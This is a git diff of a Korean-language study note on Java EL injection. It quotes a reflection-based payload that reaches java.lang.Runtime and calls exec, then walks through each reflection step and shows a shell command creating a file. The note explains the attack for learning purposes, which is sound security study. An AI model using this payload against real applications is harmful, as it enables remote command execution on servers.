@@ -133,7 +133,22 @@ EL injection을 알아보기 전에 그 공격에서 자주 사용하는 코드�
 
         "".getClass().forName("java.lang.Runtime").getMethods()[6].invoke("".getClass().forName("java.lang.Runtime")).exec("ls")
 
-가 공격 인자로 자주 들어간다. 위 공격을 메소드 단위로 쪼개 보았다. 결과만 먼저 쓰자면 큰 의미 없이 exec 이후가 실행된다는 것만 알면 되겠다.
+가 공격 인자로 자주 들어간다. 위 공격을 메소드 단위로 쪼개 보았다. 결과만 먼저 쓰자면 큰 의미 없이 exec 이후가 실행된다는 것만 알면 되겠다.  
+![source code](https://user-images.githubusercontent.com/63287638/129444916-bde767fa-06e1-4de8-900b-4372220e27f4.PNG)
+를 실행하면 
+
+        class java.lang.String
+        class java.lang.Runtime // Class.forName()은 사실 자바 리플렉션 API의 일부. 자바 리플렉션 API란
+        // 구체적인 클래스의 타입을 알지 못해도 클래스의 변수 및 메소드 등에 접근하게 해주는 API(동적 바인딩)
+        Ljava.lang.reflect.Method;@65b54208
+        31
+        public static java.lang.Runtime java.lang.Runtime.getRuntime()  // 여기까지가 위 공격에서 invoke 전까지를 의미
+
+라는 결과가 나오고  
+![01](https://user-images.githubusercontent.com/63287638/129444917-4af329b5-ab2f-4a3a-8391-2d958e850a6b.PNG)  
+위와 같이 현재 디렉터리에 abc.txt가 생성이 된다. 즉 exec에 인자로 들어간 것이 쉘에서 실행되는 것이다.
+
+#### 
 
 
 ------------------------
